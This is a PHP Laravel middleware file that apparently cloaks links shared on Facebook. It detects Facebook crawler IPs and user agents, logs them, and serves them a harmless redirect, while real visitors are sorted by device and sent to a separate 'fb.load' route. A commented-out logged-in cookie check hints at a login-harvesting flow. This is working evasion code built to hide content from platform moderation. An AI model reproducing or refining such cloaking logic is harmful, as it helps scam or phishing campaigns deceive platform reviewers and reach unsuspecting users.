<?php

namespace App\Http\Middleware;

use App\Helpers\Helper;
use App\Helpers\RequestHelper;
use App\IpFbScan;
use App\Post;
use Closure;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Session;

class FilterIP
{
    public static $URL_GET_IP_INFO = 'http://ipinfo.io/{$ip}/json';

    public function handle($request, Closure $next)
    {
        $post = null;
        $site = null;
        if ($request->has('post')) {
            $postCode = $request->post;
            $post = Post::query()
                ->where('code', $postCode)
                ->where('status', Helper::$STATUS_ON)
                ->first();
            Session::put('post', $post);
            $site = [
                'title' => $post->title,
                'img' => $post->img,
                'url' => 'https://thinh.hanh.top/',
            ];
        }
        if (!Session::has(Helper::$IS_IP_CHECKED)) {
            if (Session::has(Helper::$IS_IP_FB)) {
                return RequestHelper::redirect($site);
            }
            $ip = RequestHelper::getClientIP();
            $ipRegion = 'Hanoi';
            $isFbBot = false;
            if ($ip) {
                if (IpFbScan::query()->where([
                    'ip' => $ip,
                    'status' => Helper::$STATUS_ON,
                ])->first()) {
                    Session::put(Helper::$IS_IP_FB, true);
                    return RequestHelper::redirect($site);
                }
                $url = Helper::bindParams(self::$URL_GET_IP_INFO, ['ip' => $ip]);
                $ch = curl_init();
                $result = RequestHelper::curlExec($ch, $url);
                $ipData = json_decode($result);
                if (RequestHelper::isSuccess($ch) && $ipData) {
                    if ((array_key_exists("org", $ipData) && strpos($ipData->org, "acebook") !== false) ||
//                        (array_key_exists("country", $ipData) && strpos($ipData->country, "VN") === false) ||
                        (array_key_exists("hostname", $ipData) && strpos($ipData->hostname, "acebook") !== false)) {
                        $isFbBot = true;
                    } else {
                        if (array_key_exists('region', $ipData) && $ipData->region) {
                            $ipRegion = $ipData->region;
                        }
                    }
                }
            }
            if (strpos($_SERVER["HTTP_USER_AGENT"], "acebookexternalhit") !== false ||
                strpos($_SERVER["HTTP_USER_AGENT"], "acebot") !== false ||
                preg_match("/facebook|facebot/i", $_SERVER['HTTP_USER_AGENT']) ||
                stristr($_SERVER["HTTP_USER_AGENT"], 'FacebookExternalHit') ||
                preg_match('/^FacebookExternalHit\/.*?/i', $_SERVER["HTTP_USER_AGENT"])) {
                $isFbBot = true;
            }
            if ($isFbBot) {
                Session::put(Helper::$IS_IP_FB, true);
                if ($ip) {
                    IpFbScan::query()->create([
                        'ip' => $ip
                    ])->save();
                }
                return RequestHelper::redirect($site);
            } else {
                Session::put(Helper::$IS_IP_CHECKED, true);
                Session::put(Helper::$IP_DATA_REGION, $ipRegion);
            }
        }
        if ($request->has('post') && $post) {
            $userAgent = $_SERVER["HTTP_USER_AGENT"];
            Session::put(Helper::$USER_AGENT_DATA, $userAgent);

            $detect = new \Mobile_Detect();
            $detect->setUserAgent($userAgent);
            if ($detect->isMobile()) {
                $url = $post->url_mobile;
            } else if ($detect->isTablet()) {
                $url = $post->url_mobile;
            } else {
                $url = $post->url_pc;
            }
            Session::put('url', $url);

//            if (\Illuminate\Support\Facades\Cookie::has($post->service_alias .':::'. Helper::$CASE_LOGINNED)) {
//                return redirect()->to($url);
//            } else {
                return redirect()->route('fb.load');
//            }
        }

        return $next($request);
    }
}
